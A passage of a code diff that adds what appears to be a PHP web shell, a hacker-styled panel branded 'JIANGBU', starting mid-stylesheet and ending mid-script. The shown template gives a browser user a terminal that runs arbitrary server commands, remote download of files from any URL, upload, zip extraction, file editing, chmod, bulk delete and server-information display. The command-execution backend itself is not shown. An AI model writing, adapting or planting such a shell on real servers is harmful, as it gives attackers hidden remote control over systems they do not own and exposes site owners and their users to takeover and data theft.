+    --accent-1:#88c0d0; --accent-2:#81a1c1; --accent-3:#a3be8c;
+}
+body[data-theme="monokai"]{
+    --bg:#272822; --panel:rgba(39,40,34,.75);
+    --border:rgba(249,38,114,.25);
+    --gold:#f8f8f2; --purple:#ae81ff; --green:#a6e22e;
+    --red:#f92672; --blue:#66d9ef; --text:#f8f8f2;
+    --accent-1:#f92672; --accent-2:#ae81ff; --accent-3:#a6e22e;
+}
+body[data-theme="matrix"]{
+    --bg:#000000; --panel:rgba(0,10,0,.7);
+    --border:rgba(0,255,0,.3);
+    --gold:#00ff00; --purple:#00cc00; --green:#00ff00;
+    --red:#ff0000; --blue:#00ffaa; --text:#00ff00;
+    --accent-1:#00ff00; --accent-2:#00aa00; --accent-3:#00ff88;
+    --font-mono:'JetBrains Mono','Courier New',monospace;
+}
+body{background:var(--bg);color:var(--text);font-family:var(--font-mono);min-height:100vh;padding:20px;position:relative;overflow-x:hidden;transition:background .3s,color .3s}
+body::before{content:"";position:fixed;inset:0;background:linear-gradient(rgba(0,0,0,.72),rgba(0,0,0,.88)),url('https://i.ibb.co/bMZkJnDz/8dddee71-0638-447a-ac73-1d1f46a6ef01.png') center/cover no-repeat fixed;z-index:0;pointer-events:none;transition:background .3s}
+.scanline{position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(155,89,182,.02) 3px,rgba(155,89,182,.02) 6px);pointer-events:none;z-index:9999}
+body[data-theme="matrix"] .scanline{background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,0,.04) 3px,rgba(0,255,0,.04) 6px)}
+.wrap{max-width:1700px;margin:0 auto;position:relative;z-index:2}
+.glass{background:var(--panel);backdrop-filter:blur(16px);border-radius:12px;border:1px solid var(--border);box-shadow:0 8px 40px rgba(0,0,0,.4);transition:all .3s}
+.glass:hover{border-color:var(--accent-1);box-shadow:0 8px 50px var(--accent-2);opacity:.98}
+
+/* HEADER */
+.header{display:flex;justify-content:space-between;align-items:center;padding:18px 28px;margin-bottom:20px;position:relative;overflow:hidden}
+.header::before{content:"";position:absolute;inset:0;border-radius:12px;padding:2px;background:linear-gradient(135deg,var(--accent-1),var(--accent-2),var(--accent-3),var(--accent-1));background-size:300% 300%;-webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;animation:borderflow 6s linear infinite;pointer-events:none}
+@keyframes borderflow{0%{background-position:0% 50%}100%{background-position:300% 50%}}
+.logo h1{font-family:var(--font-head);font-size:24px;font-weight:900;background:linear-gradient(135deg,var(--accent-1),var(--accent-2),var(--accent-3));background-size:200% 200%;-webkit-background-clip:text;background-clip:text;color:transparent;letter-spacing:5px;animation:gradient 4s ease infinite}
+@keyframes gradient{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+.logo span{color:var(--purple);font-size:10px;letter-spacing:7px;opacity:.7}
+.head-right{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.clock{background:rgba(155,89,182,.1);padding:8px 16px;border-radius:8px;border:1px solid var(--border);font-size:12px;letter-spacing:1px;display:flex;gap:10px;align-items:center}
+.clock i{color:var(--gold)}
+.clock .t{color:var(--green);font-weight:700}
+.btn{background:rgba(155,89,182,.12);border:1px solid var(--border);color:var(--text);text-decoration:none;padding:9px 20px;border-radius:8px;font-size:11px;font-weight:700;letter-spacing:2px;transition:.3s;font-family:var(--font-head);cursor:pointer;display:inline-flex;align-items:center;gap:8px}
+.btn:hover{background:linear-gradient(135deg,var(--accent-1),var(--accent-2));transform:translateY(-2px);box-shadow:0 8px 30px var(--accent-2);border-color:transparent;color:var(--bg)}
+.btn.danger:hover{background:linear-gradient(135deg,var(--red),#ff0033);box-shadow:0 8px 30px rgba(255,0,51,.4);color:#fff}
+.btn.success:hover{background:linear-gradient(135deg,var(--green),#00cc33);box-shadow:0 8px 30px var(--accent-3);color:var(--bg)}
+.dot{display:inline-block;width:10px;height:10px;background:var(--green);border-radius:50%;box-shadow:0 0 15px var(--green);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.85)}}
+
+/* THEME SWITCHER */
+.theme-switcher{display:flex;gap:4px;background:rgba(0,0,0,.3);padding:4px;border-radius:10px;border:1px solid var(--border)}
+.theme-btn{background:transparent;border:none;font-size:14px;cursor:pointer;padding:6px 8px;border-radius:6px;transition:.2s;opacity:.5;line-height:1}
+.theme-btn:hover{opacity:1;background:rgba(255,255,255,.1);transform:scale(1.15)}
+.theme-btn.active{opacity:1;background:var(--accent-2);box-shadow:0 0 12px var(--accent-1)}
+
+/* PATH */
+.path{padding:14px 24px;margin-bottom:16px;font-size:13px;color:var(--purple);display:flex;align-items:center;flex-wrap:wrap;gap:4px}
+.path a{color:var(--gold);text-decoration:none;font-weight:700;padding:2px 6px;border-radius:4px;transition:.2s}
+.path a:hover{background:rgba(255,215,0,.1);text-shadow:0 0 15px var(--gold)}
+
+/* STATS */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:20px}
+.stat{padding:16px 20px;display:flex;align-items:center;gap:14px}
+.stat .ic{width:42px;height:42px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;background:rgba(155,89,182,.15);color:var(--gold)}
+.stat .val{font-family:var(--font-head);font-size:18px;font-weight:800;color:var(--text)}
+.stat .lbl{font-size:10px;letter-spacing:2px;color:var(--purple);text-transform:uppercase}
+
+/* MESSAGES */
+.msg{background:rgba(155,89,182,.08);border-left:3px solid var(--gold);padding:12px 20px;margin-bottom:10px;border-radius:8px;font-size:12px;animation:slideIn .3s ease;color:var(--text)}
+@keyframes slideIn{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}
+.msg i{color:var(--gold);margin-right:10px}
+
+/* TOOLS */
+.tools{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px;margin-bottom:24px}
+.tool{overflow:hidden;transition:.3s}
+.tool:hover{transform:translateY(-3px)}
+.tool .ttl{background:rgba(155,89,182,.08);padding:12px 18px;font-family:var(--font-head);font-weight:700;font-size:11px;letter-spacing:2px;color:var(--gold);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
+.tool .ttl i{color:var(--purple)}
+.tool .body{padding:16px}
+.tool input,.tool select,.tool textarea{width:100%;padding:11px 14px;margin-bottom:10px;background:rgba(255,255,255,.03);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;font-family:var(--font-mono);transition:.2s}
+.tool input:focus,.tool select:focus,.tool textarea:focus{outline:none;border-color:var(--gold);background:rgba(255,255,255,.05);box-shadow:0 0 25px var(--accent-2)}
+.tool input::placeholder,.tool textarea::placeholder{color:rgba(255,255,255,.3)}
+.tool button{width:100%;padding:11px;background:linear-gradient(135deg,var(--accent-1),var(--accent-2));border:none;border-radius:8px;color:var(--bg);font-weight:900;cursor:pointer;font-family:var(--font-head);font-size:11px;letter-spacing:2px;transition:.3s}
+.tool button:hover{transform:translateY(-2px);box-shadow:0 10px 30px var(--accent-2)}
+
+/* TABLE */
+.tbl-wrap{overflow-x:auto;margin-bottom:20px}
+table{width:100%;border-collapse:collapse}
+th,td{padding:13px 16px;text-align:left;border-bottom:1px solid var(--border);font-size:12px;vertical-align:middle;color:var(--text)}
+th{background:rgba(155,89,182,.06);color:var(--gold);font-family:var(--font-head);font-weight:700;font-size:10px;letter-spacing:2px;position:sticky;top:0;backdrop-filter:blur(10px)}
+tr{transition:.2s}
+tr:hover{background:rgba(155,89,182,.05)}
+tr:hover td:first-child{box-shadow:inset 3px 0 0 var(--gold)}
+.flink{text-decoration:none;font-weight:700;transition:.2s;display:inline-flex;align-items:center;gap:8px}
+.flink.dir{color:var(--gold)}
+.flink.dir:hover{text-shadow:0 0 20px var(--gold);transform:translateX(3px)}
+.flink.file{color:var(--green)}
+.flink.file:hover{text-shadow:0 0 20px var(--green);transform:translateX(3px)}
+.flink i{font-size:14px}
+.abtn{padding:5px 11px;border-radius:6px;font-size:9px;font-weight:700;display:inline-block;margin-right:3px;margin-bottom:3px;transition:.2s;text-decoration:none;font-family:var(--font-head);letter-spacing:1px;cursor:pointer;border:1px solid transparent}
+.abtn.edit{background:rgba(255,215,0,.1);color:var(--gold);border-color:var(--gold)}
+.abtn.edit:hover{background:var(--gold);color:var(--bg)}
+.abtn.del{background:rgba(255,51,102,.1);color:var(--red);border-color:var(--red)}
+.abtn.del:hover{background:var(--red);color:#fff}
+.abtn.ext{background:rgba(0,255,65,.1);color:var(--green);border-color:var(--green)}
+.abtn.ext:hover{background:var(--green);color:var(--bg)}
+.abtn.opn{background:rgba(155,89,182,.12);color:var(--purple);border-color:var(--purple)}
+.abtn.opn:hover{background:var(--purple);color:#fff}
+.abtn.dl{background:rgba(44,156,219,.1);color:var(--blue);border-color:var(--blue)}
+.abtn.dl:hover{background:var(--blue);color:#fff}
+.abtn.zip{background:rgba(255,107,61,.1);color:#ff6b3d;border-color:#ff6b3d}
+.abtn.zip:hover{background:#ff6b3d;color:#fff}
+.abtn:hover{transform:translateY(-1px)}
+input[type=checkbox]{width:18px;height:18px;accent-color:var(--purple);cursor:pointer}
+.bulk{padding:12px 20px;border-top:1px solid var(--border);display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.bulk button{padding:9px 18px;background:rgba(255,51,102,.1);border:1px solid var(--red);border-radius:8px;color:var(--red);font-weight:700;cursor:pointer;font-family:var(--font-head);font-size:10px;letter-spacing:2px;transition:.3s}
+.bulk button:hover{background:var(--red);color:#fff;box-shadow:0 8px 25px rgba(255,51,102,.3)}
+.bulk label{color:var(--purple) !important}
+
+/* TERMINAL */
+.term{margin-top:20px;overflow:hidden}
+.term .ttl{background:rgba(155,89,182,.08);padding:12px 20px;font-family:var(--font-head);font-weight:700;font-size:11px;letter-spacing:2px;color:var(--gold);border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
+.term .out{padding:20px;background:rgba(0,0,0,.35);font-family:var(--font-mono);font-size:12px;max-height:400px;overflow-y:auto;white-space:pre-wrap;color:var(--green);line-height:1.5}
+body[data-theme="matrix"] .term .out{text-shadow:0 0 8px #00ff00;background:rgba(0,0,0,.7)}
+.copy{background:rgba(0,255,65,.1);border:1px solid var(--green);color:var(--green);padding:5px 12px;border-radius:6px;font-size:10px;cursor:pointer;font-family:var(--font-head);letter-spacing:1px;transition:.2s}
+.copy:hover{background:var(--green);color:var(--bg)}
+
+/* EDITOR */
+.editor{padding:24px;margin-bottom:20px}
+.editor h3{color:var(--gold);font-family:var(--font-head);font-size:14px;letter-spacing:3px;margin-bottom:16px;display:flex;align-items:center;gap:12px}
+.editor textarea{width:100%;height:450px;background:rgba(0,0,0,.35);border:1px solid var(--border);border-radius:8px;padding:16px;font-family:var(--font-mono);color:var(--text);font-size:13px;line-height:1.5;resize:vertical}
+.editor textarea:focus{outline:none;border-color:var(--gold);box-shadow:0 0 30px var(--accent-2)}
+.editor .actions{margin-top:14px;display:flex;gap:12px;align-items:center;flex-wrap:wrap}
+.editor button{padding:11px 26px;background:linear-gradient(135deg,var(--accent-1),var(--accent-2));border:none;border-radius:8px;color:var(--bg);font-weight:900;cursor:pointer;font-family:var(--font-head);font-size:11px;letter-spacing:2px;transition:.3s}
+.editor button:hover{transform:translateY(-2px);box-shadow:0 10px 30px var(--accent-2)}
+.editor a{color:var(--purple);text-decoration:none;font-size:11px;letter-spacing:1px;padding:8px 14px;border:1px solid var(--border);border-radius:8px;transition:.2s}
+.editor a:hover{border-color:var(--purple);background:rgba(155,89,182,.1)}
+
+/* MODAL */
+.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(10px);justify-content:center;align-items:center;z-index:1000;animation:fadeIn .2s}
+.modal.show{display:flex}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.mbox{background:var(--panel);padding:30px;border-radius:14px;max-width:440px;width:90%;position:relative;animation:popIn .3s;border:1px solid var(--border)}
+@keyframes popIn{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}
+.mbox::before{content:"";position:absolute;inset:-2px;border-radius:16px;padding:2px;background:linear-gradient(135deg,var(--accent-1),var(--accent-2));-webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
+.mbox h3{margin-bottom:20px;color:var(--gold);font-family:var(--font-head);font-size:14px;letter-spacing:3px}
+.mbox input{width:100%;padding:13px;margin:14px 0;border-radius:8px;border:1px solid var(--border);background:rgba(255,255,255,.03);color:var(--text);font-family:var(--font-mono);font-size:13px}
+.mbox input:focus{outline:none;border-color:var(--gold);box-shadow:0 0 25px var(--accent-2)}
+.mbox button{padding:9px 22px;background:linear-gradient(135deg,var(--accent-1),var(--accent-2));border:none;border-radius:8px;color:var(--bg);font-weight:900;margin-right:10px;cursor:pointer;font-family:var(--font-head);font-size:10px;letter-spacing:2px;transition:.3s}
+.mbox button:hover{transform:translateY(-2px);box-shadow:0 8px 25px var(--accent-2)}
+.mbox button.cancel{background:rgba(255,51,102,.1);color:var(--red);border:1px solid var(--red)}
+.mbox button.cancel:hover{background:var(--red);color:#fff}
+
+/* SCROLLBAR */
+::-webkit-scrollbar{width:8px;height:8px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:linear-gradient(135deg,var(--accent-1),var(--accent-2));border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:linear-gradient(135deg,var(--accent-3),var(--accent-2))}
+
+/* TOAST */
+.toast{position:fixed;bottom:30px;right:30px;background:var(--panel);border:1px solid var(--gold);border-radius:10px;padding:14px 22px;color:var(--text);font-size:12px;z-index:2000;box-shadow:0 10px 40px var(--accent-2);animation:slideUp .3s;max-width:350px}
+@keyframes slideUp{from{transform:translateY(50px);opacity:0}to{transform:translateY(0);opacity:1}}
+
+.empty{text-align:center;padding:60px 20px;color:rgba(255,255,255,.4)}
+.empty i{font-size:60px;color:var(--purple);margin-bottom:16px;opacity:.5;display:block}
+.empty p{font-size:14px;letter-spacing:2px}
+</style>
+</head>
+<body data-theme="<?= htmlspecialchars($current_theme, ENT_QUOTES) ?>">
+<div class="scanline"></div>
+<div class="wrap">
+
+    <!-- HEADER -->
+    <div class="header glass">
+        <div class="logo">
+            <h1>✦ JIANGBU</h1>
+            <span>APA CARIK</span>
+        </div>
+        <div class="head-right">
+            <div class="theme-switcher">
+                <button class="theme-btn" data-set-theme="default" title="Nexus">✦</button>
+                <button class="theme-btn" data-set-theme="dracula" title="Dracula">🧛</button>
+                <button class="theme-btn" data-set-theme="nord" title="Nord">❄️</button>
+                <button class="theme-btn" data-set-theme="monokai" title="Monokai">🎨</button>
+                <button class="theme-btn" data-set-theme="matrix" title="Matrix">🟢</button>
+            </div>
+            <div class="clock">
+                <i class="fas fa-calendar-alt"></i>
+                <span><?= date('d M Y') ?></span>
+                <span style="color:rgba(255,255,255,.2)">|</span>
+                <i class="fas fa-clock"></i>
+                <span class="t" id="clock"><?= date('H:i:s') ?></span>
+            </div>
+            <span class="dot"></span>
+            <a href="?d=<?= urlencode($currentDir) ?><?= $showHidden ? '&hidden=1' : '' ?>" class="btn"><i class="fas fa-sync-alt"></i> REFRESH</a>
+            <a href="?logout=1" class="btn danger"><i class="fas fa-power-off"></i> EXIT</a>
+        </div>
+    </div>
+
+    <!-- PATH -->
+    <div class="path glass">
+        <i class="fas fa-folder-open" style="color:var(--gold);margin-right:10px"></i>
+        <?php
+        $parts = explode('/', trim($currentDir, '/'));
+        $cur = '';
+        echo '<a href="?d=/"><i class="fas fa-home"></i> root</a>';
+        foreach ($parts as $p) {
+            if ($p === '') continue;
+            $cur .= '/' . $p;
+            echo '<span style="color:rgba(255,255,255,.3)"> / </span><a href="?d=' . urlencode($cur) . '">' . htmlspecialchars($p) . '</a>';
+        }
+        ?>
+    </div>
+
+    <!-- STATS -->
+    <div class="stats">
+        <div class="stat glass"><div class="ic"><i class="fas fa-folder"></i></div><div><div class="val"><?= count($dirs) ?></div><div class="lbl">Folders</div></div></div>
+        <div class="stat glass"><div class="ic"><i class="fas fa-file"></i></div><div><div class="val"><?= count($files) ?></div><div class="lbl">Files</div></div></div>
+        <div class="stat glass"><div class="ic"><i class="fas fa-hdd"></i></div><div><div class="val"><?= formatBytes($totalSize) ?></div><div class="lbl">Total Size</div></div></div>
+        <div class="stat glass"><div class="ic"><i class="fas fa-microchip"></i></div><div><div class="val"><?= htmlspecialchars($serverInfo['PHP']) ?></div><div class="lbl">PHP Version</div></div></div>
+        <div class="stat glass"><div class="ic"><i class="fas fa-server"></i></div><div><div class="val"><?= htmlspecialchars($serverInfo['OS']) ?></div><div class="lbl">Platform</div></div></div>
+    </div>
+
+    <!-- MESSAGES -->
+    <?php foreach ($messages as $m): ?>
+        <div class="msg"><i class="fas fa-chevron-right"></i><?= htmlspecialchars($m) ?></div>
+    <?php endforeach; ?>
+
+    <!-- TOOLS -->
+    <div class="tools">
+        <div class="tool glass">
+            <div class="ttl"><i class="fas fa-upload"></i> UPLOAD FILES</div>
+            <div class="body">
+                <form method="POST" enctype="multipart/form-data">
+                    <input type="hidden" name="csrf" value="<?= $CSRF ?>">
+                    <input type="file" name="files[]" multiple required>
+                    <button type="submit"><i class="fas fa-cloud-upload-alt"></i> UPLOAD</button>
+                </form>
+            </div>
+        </div>
+        <div class="tool glass">
+            <div class="ttl"><i class="fas fa-file-archive"></i> EXTRACT ZIP</div>
+            <div class="body">
+                <form method="POST" enctype="multipart/form-data">
+                    <input type="hidden" name="csrf" value="<?= $CSRF ?>">
+                    <input type="file" name="archive" accept=".zip" required>
+                    <button type="submit"><i class="fas fa-box-open"></i> EXTRACT</button>
+                </form>
+            </div>
+        </div>
+        <div class="tool glass">
+            <div class="ttl"><i class="fas fa-terminal"></i> TERMINAL</div>
+            <div class="body">
+                <form method="POST">
+                    <input type="hidden" name="csrf" value="<?= $CSRF ?>">
+                    <input type="text" name="command" placeholder="ls -la, whoami, pwd..." autocomplete="off" required>
+                    <button type="submit"><i class="fas fa-play"></i> RUN</button>
+                </form>
+            </div>
+        </div>
+        <div class="tool glass">
+            <div class="ttl"><i class="fas fa-plus-circle"></i> CREATE</div>
+            <div class="body">
+                <form method="POST">
+                    <input type="hidden" name="csrf" value="<?= $CSRF ?>">
+                    <input type="text" name="name" placeholder="File or folder name" required>
+                    <select name="type"><option value="file">📄 File</option><option value="folder">📁 Folder</option></select>
+                    <textarea name="content" placeholder="Content (for file)..." rows="2"></textarea>
+                    <button type="submit" name="create_action" value="1"><i class="fas fa-plus"></i> CREATE</button>
+                </form>
+            </div>
+        </div>
+        <div class="tool glass">
+            <div class="ttl"><i class="fas fa-cloud-download-alt"></i> REMOTE DOWNLOAD</div>
+            <div class="body">
+                <form method="POST">
+                    <input type="hidden" name="csrf" value="<?= $CSRF ?>">
+                    <input type="url" name="download_url" placeholder="https://example.com/file.zip" required>
+                    <input type="text" name="download_name" placeholder="Filename (optional)">
+                    <button type="submit"><i class="fas fa-download"></i> DOWNLOAD</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- FILE LIST -->
+    <div class="glass" style="margin-bottom:20px">
+        <form method="POST" id="bulkForm">
+            <input type="hidden" name="csrf" value="<?= $CSRF ?>">
+            <div class="tbl-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th style="width:44px"><input type="checkbox" id="selAll"></th>
+                            <th>NAME</th>
+                            <th style="width:110px">SIZE</th>
+                            <th style="width:90px">PERM</th>
+                            <th style="width:180px">MODIFIED</th>
+                            <th style="width:340px">ACTIONS</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <?php if (empty($dirs) && empty($files)): ?>
+                        <tr><td colspan="6"><div class="empty"><i class="fas fa-folder-open"></i><p>EMPTY DIRECTORY</p></div></td></tr>
+                        <?php endif; ?>
+
+                        <?php foreach ($dirs as $item):
+                            $path = $currentDir . $item;
+                            $perms = substr(sprintf('%o', fileperms($path)), -4);
+                            $mod = date('Y-m-d H:i:s', filemtime($path));
+                        ?>
+                        <tr>
+                            <td><input type="checkbox" name="selected_items[]" value="<?= htmlspecialchars($item, ENT_QUOTES) ?>"></td>
+                            <td><a href="?d=<?= urlencode($path) ?>" class="flink dir"><i class="fas fa-folder"></i><?= htmlspecialchars($item) ?></a></td>
+                            <td style="color:rgba(255,255,255,.5)">DIR</td>
+                            <td style="color:var(--blue)"><?= $perms ?></td>
+                            <td style="color:rgba(255,255,255,.6);font-size:11px"><?= $mod ?></td>
+                            <td>
+                                <a href="#" onclick="showRename('<?= htmlspecialchars(addslashes($item), ENT_QUOTES) ?>');return false" class="abtn edit"><i class="fas fa-i-cursor"></i> RENAME</a>
+                                <a href="#" onclick="showChmod('<?= htmlspecialchars(addslashes($item), ENT_QUOTES) ?>','<?= $perms ?>');return false" class="abtn edit"><i class="fas fa-key"></i> CHMOD</a>
+                                <button type="submit" name="compress_target" value="<?= htmlspecialchars($item, ENT_QUOTES) ?>" class="abtn zip"><i class="fas fa-file-zipper"></i> ZIP</button>
+                                <a href="?d=<?= urlencode($currentDir) ?>&delete=<?= urlencode($item) ?>" class="abtn del" onclick="return confirm('DELETE FOLDER: <?= htmlspecialchars(addslashes($item), ENT_QUOTES) ?>?')"><i class="fas fa-trash"></i> DEL</a>
+                            </td>
+                        </tr>
+                        <?php endforeach; ?>
+
+                        <?php foreach ($files as $item):
+                            $path = $currentDir . $item;
+                            $size = (int)@filesize($path);
+                            $perms = substr(sprintf('%o', fileperms($path)), -4);
+                            $mod = date('Y-m-d H:i:s', filemtime($path));
+                            $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
+                            $editable = $size < 5 * 1024 * 1024 && !in_array($ext, ['zip','rar','gz','jpg','jpeg','png','gif','mp4','mp3','avi','mov','pdf','exe','bin','iso']);
+                            [$icon, $color] = fileIcon($item);
+                        ?>
+                        <tr>
+                            <td><input type="checkbox" name="selected_items[]" value="<?= htmlspecialchars($item, ENT_QUOTES) ?>"></td>
+                            <td>
+                                <?php if ($editable): ?>
+                                    <a href="?d=<?= urlencode($currentDir) ?>&edit=<?= urlencode($item) ?>" class="flink file"><i class="fas <?= $icon ?>" style="color:<?= $color ?>"></i><?= htmlspecialchars($item) ?></a>
+                                <?php else: ?>
+                                    <span class="flink file" style="cursor:default"><i class="fas <?= $icon ?>" style="color:<?= $color ?>"></i><?= htmlspecialchars($item) ?></span>
+                                <?php endif; ?>
+                            </td>
+                            <td style="color:rgba(255,255,255,.7)"><?= formatBytes($size) ?></td>
+                            <td style="color:var(--blue)"><?= $perms ?></td>
+                            <td style="color:rgba(255,255,255,.6);font-size:11px"><?= $mod ?></td>
+                            <td>
+                                <a href="?d=<?= urlencode($currentDir) ?>&download=<?= urlencode($item) ?>" class="abtn dl"><i class="fas fa-download"></i> DL</a>
+                                <?php if ($editable): ?><a href="?d=<?= urlencode($currentDir) ?>&edit=<?= urlencode($item) ?>" class="abtn edit"><i class="fas fa-pen"></i> EDIT</a><?php endif; ?>
+                                <?php if ($ext === 'zip'): ?><a href="?d=<?= urlencode($currentDir) ?>&extract=<?= urlencode($item) ?>" class="abtn ext"><i class="fas fa-box-open"></i> EXTRACT</a><?php endif; ?>
+                                <a href="#" onclick="showRename('<?= htmlspecialchars(addslashes($item), ENT_QUOTES) ?>');return false" class="abtn edit"><i class="fas fa-i-cursor"></i> RENAME</a>
+                                <a href="#" onclick="showChmod('<?= htmlspecialchars(addslashes($item), ENT_QUOTES) ?>','<?= $perms ?>');return false" class="abtn edit"><i class="fas fa-key"></i> CHMOD</a>
+                                <a href="?d=<?= urlencode($currentDir) ?>&delete=<?= urlencode($item) ?>" class="abtn del" onclick="return confirm('DELETE: <?= htmlspecialchars(addslashes($item), ENT_QUOTES) ?>?')"><i class="fas fa-trash"></i> DEL</a>
+                            </td>
+                        </tr>
+                        <?php endforeach; ?>
+                    </tbody>
+                </table>
+            </div>
+            <div class="bulk">
+                <button type="submit" name="delete_selected" value="1" onclick="return confirm('DELETE ALL SELECTED ITEMS?')"><i class="fas fa-trash-alt"></i> DELETE SELECTED</button>
+                <label style="display:flex;align-items:center;gap:8px;font-size:11px;letter-spacing:1px;cursor:pointer">
+                    <input type="checkbox" onchange="location.href='?d=<?= urlencode($currentDir) ?>&hidden=<?= $showHidden ? '0' : '1' ?>'" <?= $showHidden ? 'checked' : '' ?>>
+                    SHOW HIDDEN FILES
+                </label>
+            </div>
+        </form>
+    </div>
+
+    <!-- EDITOR -->
+    <?php if ($editFile !== null): ?>
+    <div class="editor glass">
+        <h3><i class="fas fa-pen-fancy" style="color:var(--purple)"></i> EDITING: <?= htmlspecialchars($editFile) ?></h3>
+        <form method="POST">
+            <input type="hidden" name="csrf" value="<?= $CSRF ?>">
+            <textarea name="edit_content" id="editorArea" spellcheck="false"><?= htmlspecialchars($editContent) ?></textarea>
+            <input type="hidden" name="edit_file" value="<?= htmlspecialchars($editFile, ENT_QUOTES) ?>">
+            <div class="actions">
+                <button type="submit"><i class="fas fa-save"></i> SAVE (Ctrl+S)</button>
+                <a href="?d=<?= urlencode($currentDir) ?>"><i class="fas fa-times"></i> CANCEL</a>
+            </div>
+        </form>
+    </div>
+    <?php endif; ?>
+
+    <!-- TERMINAL OUTPUT -->
+    <div class="term glass">
+        <div class="ttl">
+            <span><i class="fas fa-terminal"></i> COMMAND OUTPUT</span>
+            <button class="copy" onclick="copyOutput()"><i class="fas fa-copy"></i> COPY</button>
+        </div>
+        <div class="out" id="termOut"><?= $commandOutput !== '' ? htmlspecialchars($commandOutput) : '> Ready for commands...' ?></div>
+    </div>
+
+    <!-- SERVER INFO -->
+    <div class="term glass" style="margin-top:20px">
+        <div class="ttl"><span><i class="fas fa-info-circle"></i> SERVER INFO</span></div>
+        <div class="out" style="font-size:12px">
+<?php foreach ($serverInfo as $k => $v): ?>
+<span style="color:var(--gold)"><?= str_pad($k, 8) ?></span> : <span style="color:var(--green)"><?= htmlspecialchars((string)$v) ?></span>
+<?php endforeach; ?>
+        </div>
+    </div>
+
+</div>
+
+<!-- MODALS -->
+<div id="renameModal" class="modal">
+    <div class="mbox">
+        <h3><i class="fas fa-i-cursor"></i> RENAME ITEM</h3>
+        <form method="POST">
+            <input type="hidden" name="csrf" value="<?= $CSRF ?>">
+            <input type="hidden" name="rename_old" id="renameOld">
+            <input type="text" name="rename_new" id="renameNew" placeholder="New name" required>
+            <button type="submit"><i class="fas fa-check"></i> RENAME</button>
+            <button type="button" class="cancel" onclick="closeModal('renameModal')">CANCEL</button>
+        </form>
+    </div>
+</div>
+<div id="chmodModal" class="modal">
+    <div class="mbox">
+        <h3><i class="fas fa-key"></i> CHANGE PERMISSIONS</h3>
+        <form method="POST">
+            <input type="hidden" name="csrf" value="<?= $CSRF ?>">
+            <input type="hidden" name="chmod_file" id="chmodFile">
+            <input type="text" name="chmod_value" id="chmodValue" placeholder="e.g. 0755" required pattern="0?[0-7]{3,4}">
+            <button type="submit"><i class="fas fa-check"></i> APPLY</button>
+            <button type="button" class="cancel" onclick="closeModal('chmodModal')">CANCEL</button>
+        </form>
+    </div>
+</div>
+
+<script>
+// Live clock
+setInterval(() => {
+    const d = new Date();
+    document.getElementById('clock').textContent = d.toTimeString().split(' ')[0];
+}, 1000);
+
+// Select all
+document.getElementById('selAll')?.addEventListener('change', e => {
+    document.querySelectorAll('input[name="selected_items[]"]').forEach(cb => cb.checked = e.target.checked);
+});
+
+// Modals
+function showRename(name) {
+    document.getElementById('renameOld').value = name;
+    document.getElementById('renameNew').value = name;
+    document.getElementById('renameModal').classList.add('show');
+}
+function showChmod(name, perm) {
+    document.getElementById('chmodFile').value = name;
+    document.getElementById('chmodValue').value = perm;
+    document.getElementById('chmodModal').classList.add('show');
+}
+function closeModal(id) {
+    document.getElementById(id).classList.remove('show');
+}
+document.querySelectorAll('.modal').forEach(m => {
+    m.addEventListener('click', e => { if (e.target === m) m.classList.remove('show'); });
+});
+document.addEventListener('keydown', e => {
+    if (e.key === 'Escape') document.querySelectorAll('.modal.show').forEach(m => m.classList.remove('show'));
+});
+
+// Auto hide messages
+setTimeout(() => {
+    document.querySelectorAll('.msg').forEach(m => {
+        m.style.transition = 'all .5s';
+        m.style.opacity = '0';
+        m.style.transform = 'translateX(-30px)';
+        setTimeout(() => m.remove(), 500);
+    });
+}, 6000);
+
+// Copy terminal output
+function copyOutput() {
+    const txt = document.getElementById('termOut').innerText;
+    navigator.clipboard.writeText(txt).then(() => {
+        showToast('Copied to clipboard!');
+    });
+}
+
+// Toast
+function showToast(msg) {
+    const t = document.createElement('div');
+    t.className = 'toast';
+    t.innerHTML = '<i class="fas fa-check-circle" style="color:var(--green);margin-right:8px"></i>' + msg;
+    document.body.appendChild(t);
+    setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity .4s'; setTimeout(() => t.remove(), 400); }, 2500);
+}
+
+// Ctrl+S in editor
+const ed = document.getElementById('editorArea');
+if (ed) {
+    ed.addEventListener('keydown', e => {
+        if ((e.ctrlKey || e.metaKey) && e.key === 's') {
+            e.preventDefault();
+            ed.closest('form').submit();
+        }
+        if (e.key === 'Tab') {
+            e.preventDefault();
+            const s = ed.selectionStart, end = ed.selectionEnd;
+            ed.value = ed.value.substring(0, s) + '    ' + ed.value.substring(end);
+            ed.selectionStart = ed.selectionEnd = s + 4;
+        }
+    });
+}
+
+// ========== THEME SWITCHER ==========
+document.querySelectorAll('.theme-btn').forEach(b => {
+    if (b.dataset.setTheme === document.body.dataset.theme) b.classList.add('active');
+    b.addEventListener('click', () => {
+        const t = b.dataset.setTheme;
+        document.body.dataset.theme = t;
